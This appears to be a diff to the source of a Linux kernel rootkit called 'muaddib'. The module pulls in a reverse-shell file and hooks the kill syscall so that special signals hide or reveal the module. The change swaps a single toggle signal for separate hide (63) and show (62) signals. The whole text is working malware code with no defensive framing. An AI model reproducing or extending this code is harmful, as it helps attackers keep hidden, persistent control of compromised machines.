@@ -1,7 +1,6 @@
 #include "revshell.c"
 
 static struct list_head *prev_module;
-static short hidden = 0;
 char hide_pid[NAME_MAX];
 
 #ifdef PTREGS_SYSCALL_STUBS
@@ -50,23 +49,19 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
         return 0;
     }
 
-    else if(sig == 43){
-        if(hidden == 0){
-            #if DEBUGMSG == 1
-            printk(KERN_INFO "muaddib: hiding");
-            #endif
-            hideme();
-            hidden = 1;
-            return 0;
-        }
-        else if(hidden == 1){
-            #if DEBUGMSG == 1
-            printk(KERN_INFO "muaddib: showing");
-            #endif
-            showme();
-            hidden = 0;
-            return 0;
-        }
+    else if(sig == 63){
+        #if DEBUGMSG == 1
+        printk(KERN_INFO "muaddib: hiding");
+        #endif
+        hideme();
+        return 0;
+    }
+    else if(sig == 62){
+        #if DEBUGMSG == 1
+        printk(KERN_INFO "muaddib: showing");
+        #endif
+        showme();
+        return 0;
     }
     else if(sig == 44){
         #if DEBUGMSG == 1
